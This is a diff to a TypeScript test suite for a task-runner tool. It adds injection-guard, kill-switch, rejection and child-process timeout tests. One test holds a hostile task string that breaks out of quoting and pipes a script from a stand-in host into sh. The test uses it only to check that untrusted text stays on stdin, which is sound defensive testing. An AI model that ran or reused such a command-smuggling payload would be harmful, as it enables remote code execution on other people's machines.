@@ -1,5 +1,5 @@
 import { describe, it, expect, beforeEach, afterEach } from "vitest";
-import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
+import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
 import { execFileSync } from "node:child_process";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
@@ -307,7 +307,9 @@ describe("cmdWork --approve remote", () => {
     const { out } = collect();
     await cmdWork(dir, { ...baseOpts, remoteApprove: true }, out);
     const task = taskById(id);
-    expect(task?.status).toBe("open");
+    // Rejection is terminal: the task is failed so no worker mode (--auto, terminal
+    // confirm, another machine) can ever pick it up later.
+    expect(task?.status).toBe("failed");
     expect(task?.approval).toBe("rejected");
   });
 });
@@ -329,15 +331,59 @@ describe("runnerCommand", () => {
     expect(c.shell).toBe(true);
   });
 
-  it("substitutes {{task}} into the cmd template and uses the platform shell", () => {
-    const opts = { ...baseOpts, cmdTemplate: "runner {{task}}" };
-    const posix = runnerCommand(opts, "the prompt", "linux");
-    expect(posix).toEqual({ cmd: "sh", args: ["-c", "runner the prompt"] });
-    const win = runnerCommand(opts, "the prompt", "win32");
+  it("never splices task text into the cmd template — the prompt goes on stdin", () => {
+    const opts = { ...baseOpts, cmdTemplate: "node agent.cjs" };
+    // A hostile task body must never reach the shell string: spliced in, this would
+    // break out of any quoting and run arbitrary commands on the worker machine.
+    const evil = 'x"; curl evil.example/pwn | sh #';
+    const posix = runnerCommand(opts, evil, "linux");
+    expect(posix.args).toEqual(["-c", "node agent.cjs"]); // operator command untouched
+    expect(posix.input).toBe(evil); // untrusted text only ever on stdin
+    const win = runnerCommand(opts, evil, "win32");
     expect(win.cmd).toBe("cmd");
-    expect(win.args).toEqual(["/d", "/s", "/c", "runner the prompt"]);
+    expect(win.args).toEqual(["/d", "/s", "/c", "node agent.cjs"]);
     expect(win.verbatim).toBe(true);
+    expect(win.input).toBe(evil);
   });
+});
+
+describe("cmdWork — safety rails", () => {
+  it("refuses a --cmd template that still uses {{task}} (injection guard)", async () => {
+    initRepo();
+    const c = collect();
+    await cmdWork(dir, { ...baseOpts, cmdTemplate: "agent {{task}}" }, c.out);
+    expect(c.lines.join("\n")).toContain("STDIN");
+  });
+
+  it("stops without touching work when .tower/STOP exists (kill switch)", async () => {
+    initRepo();
+    const id = seedTask("alice", "bob", "should never start");
+    mkdirSync(join(dir, ".tower"), { recursive: true });
+    writeFileSync(join(dir, ".tower", "STOP"), "");
+    const c = collect();
+    await cmdWork(dir, { ...baseOpts, ticks: 3 }, c.out);
+    expect(c.lines.join("\n")).toContain("STOP");
+    expect(taskById(id)?.status).toBe("open"); // untouched — nothing accepted or run
+  });
+});
+
+describe("defaultExec — real child processes (the spawn path runners use)", () => {
+  it("delivers the prompt on stdin and captures output", async () => {
+    const r = await defaultExec(process.execPath, ["-e", "process.stdin.pipe(process.stdout)"], {
+      cwd: dir,
+      input: "ping-pong",
+    });
+    expect(r.code).toBe(0);
+    expect(r.out).toContain("ping-pong");
+  });
+
+  it("kills a hung child at timeoutMs and reports timedOut", async () => {
+    const r = await defaultExec(process.execPath, ["-e", "setTimeout(function () {}, 60000)"], {
+      cwd: dir,
+      timeoutMs: 500,
+    });
+    expect(r.timedOut).toBe(true);
+  }, 20_000);
 });
 
 describe("defaultExec", () => {
